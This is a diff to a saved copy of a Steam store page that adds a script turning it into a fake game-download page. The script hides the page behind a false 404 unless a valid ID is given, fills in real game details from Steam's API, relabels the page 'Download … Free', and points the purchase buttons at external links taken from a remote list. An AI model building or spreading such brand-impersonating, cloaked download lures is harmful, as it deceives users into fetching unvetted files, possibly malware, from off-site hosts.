@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+<!-- saved from url=(0086)file:///C:/Users/Gamer/Downloads/Steam%20Test/Download/DownloadPage%20-%20Editing.html -->
 <html class=" responsive DesktopUI" lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <link rel="icon" data-savepage-href="https://store.steampowered.com/favicon.ico" href="data:image/x-icon;base64,...">
 	
@@ -28570,6 +28571,149 @@ html.responsive body.OverlayWindowPinnedView.responsive_page {
 	background: none;
 }
 </style>
+<script>
+(() => {
+  // --- Config ---
+  const BOTTOM_TXT_URL = "https://solal0.github.io/Skira-n-Stuff/Skira%27s%20Library/Lists/bottom.txt";
+  const CORS_PROXY = url => `https://corsproxy.io/?${encodeURIComponent(url)}`; // reliable proxy
+
+  // --- Helpers ---
+  function show404() {
+    document.documentElement.innerHTML = '';
+    const s = document.createElement('style');
+    s.textContent = `
+      body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#111;color:#eee}
+      .err{text-align:center}
+      .err h1{font-size:28px;margin:0 0 8px}
+      .err p{opacity:.8;margin:0}
+    `;
+    document.head.appendChild(s);
+    const wrapper = document.createElement('div');
+    wrapper.className = 'err';
+    wrapper.innerHTML = `<h1>Error 404: Content Unavailable</h1><p>The page you requested is not available.</p>`;
+    document.body.appendChild(wrapper);
+  }
+
+  function removeAllContentAnd404() { try { show404(); } catch(e) { document.body.innerHTML = 'Error 404: Content Unavailable'; } }
+  const qs = (sel, ctx=document) => ctx.querySelector(sel);
+  const qsa = (sel, ctx=document) => Array.from(ctx.querySelectorAll(sel));
+
+  // --- DOM ready ---
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', main);
+  else main();
+
+  async function main() {
+    try {
+      // 1) Check URL pattern ?{numbers}
+      const query = window.location.search;
+      const m = query.match(/^\?(\d+)$/);
+      if (!m) { removeAllContentAnd404(); return; }
+      const urlId = m[1];
+
+      // 2) Fetch bottom.txt
+      let list;
+      try {
+        const res = await fetch(BOTTOM_TXT_URL, {cache: "no-store"});
+        if (!res.ok) throw new Error('failed to fetch bottom list');
+        list = await res.json();
+      } catch (e) {
+        console.error('Failed to load bottom.txt', e);
+        removeAllContentAnd404();
+        return;
+      }
+
+      // 3) Check ID
+      const match = Array.isArray(list) ? list.find(it => String(it.id) === String(urlId)) : null;
+      if (!match) { removeAllContentAnd404(); return; }
+      const topUrl = match.topUrl, bottomUrl = match.bottomUrl;
+
+      // 4) Hook up buttons (blue / green)
+      const attachButtons = () => {
+        const blue = qs('.btn_blue_steamui.btn_medium');
+        const green = qs('.btn_green_steamui.btn_medium');
+        if (blue) { blue.onclick = e => { e.preventDefault(); window.open(topUrl,'_blank'); }; blue.style.cursor='pointer'; }
+        if (green) { green.onclick = e => { e.preventDefault(); window.open(bottomUrl,'_blank'); }; green.style.cursor='pointer'; }
+      };
+      attachButtons();
+      new MutationObserver(() => attachButtons()).observe(document.documentElement,{childList:true,subtree:true});
+
+      // 5) Fetch Steam public API
+      const steamApiUrl = `https://store.steampowered.com/api/appdetails?appids=${encodeURIComponent(urlId)}&cc=us&l=en`;
+      let gameData = null;
+      try {
+        const res = await fetch(CORS_PROXY(steamApiUrl), {cache:"no-store"});
+        if (!res.ok) throw new Error('steam api fetch failed');
+        const json = await res.json();
+        if (json && json[urlId] && json[urlId].success && json[urlId].data) gameData = json[urlId].data;
+      } catch(e) { console.warn('Steam fetch failed, continuing without metadata', e); }
+
+      if(!gameData) return; // skip if failed
+
+      // --- Utility to pick random preview ---
+      function randomPreview() {
+        const shots = Array.isArray(gameData.screenshots)?gameData.screenshots.map(s=>s.path_full).filter(u=>u&&!u.startsWith('blob:')):[];
+        const movies = Array.isArray(gameData.movies)?gameData.movies.flatMap(m=>m?.thumbnail?[m.thumbnail]:[]):[];
+        const candidates = [];
+        if(gameData.header_image) candidates.push(gameData.header_image);
+        candidates.push(...shots,...movies);
+        if(!candidates.length && gameData.background) candidates.push(gameData.background);
+        if(!candidates.length) return '';
+        return candidates[Math.floor(Math.random()*candidates.length)];
+      }
+
+      // --- Update elements as soon as possible ---
+      const updateHeader = () => {
+        const headerImg = qs('.game_header_image_full');
+        if(headerImg && gameData.header_image) { headerImg.src = gameData.header_image; headerImg.srcset=''; }
+      };
+
+      const updateMovieThumbs = () => {
+        qsa('.movie_thumb').forEach(img=>{
+          const rp = randomPreview();
+          if(rp){
+            img.src = rp;
+            img.width = 116;
+            img.height = 65;
+          }
+        });
+      };
+
+      const updatePoster = () => {
+        const videoEl = qs('video[data-savepage-poster]');
+        const rp = randomPreview();
+        if(videoEl && rp){
+          videoEl.setAttribute('data-savepage-poster', rp);
+          videoEl.setAttribute('poster', rp);
+        }
+      };
+
+      const updateHighlightStrip = () => {
+        qsa('#highlight_strip [data-panel]').forEach(panel=>{
+          qsa('img',panel).forEach(img=>{ const rp=randomPreview(); if(rp) img.src=rp; });
+          qsa('[style]',panel).forEach(el=>{ const rp=randomPreview(); if(rp && /background(-image)?:/.test(el.style.cssText)) el.style.backgroundImage=`url("${rp}")`; });
+        });
+      };
+
+      const updateTexts = () => {
+        const purchaseH1 = qs('.game_area_purchase_game.demo_above_purchase h1'); if(purchaseH1) purchaseH1.textContent=`Download ${gameData.name} Free`;
+        const appName = qs('.apphub_AppName'); if(appName) appName.textContent=gameData.name;
+        const dateEl = qs('.date'); if(dateEl) dateEl.textContent=gameData.release_date?.date || (gameData.release_date?.coming?'Coming Soon':'');
+        const descEl = qs('.game_description_snippet'); if(descEl) descEl.textContent=gameData.short_description||'';
+      };
+
+      // Run all updates immediately
+      updateHeader(); updateMovieThumbs(); updatePoster(); updateHighlightStrip(); updateTexts();
+
+      // Also observe DOM for dynamically added elements
+      const observer2 = new MutationObserver(()=>{
+        updateHeader(); updateMovieThumbs(); updatePoster(); updateHighlightStrip(); updateTexts();
+      });
+      observer2.observe(document.documentElement,{childList:true,subtree:true});
+
+    } catch(err) { console.error('Unexpected script error', err); removeAllContentAnd404(); }
+  }
+})();
+</script>
 <script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://store.fastly.steamstatic.com/public/shared/javascript/jquery-1.8.3.min.js?v=NXam5zydzNu8&amp;l=french&amp;_cdn=fastly"></script>
 <script data-savepage-type="text/javascript" type="text/plain"></script><script data-savepage-type="text/javascript" type="text/plain"></script><script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://store.fastly.steamstatic.com/public/shared/javascript/tooltip.js?v=LZHsOVauqTrm&amp;l=french&amp;_cdn=fastly"></script>
 
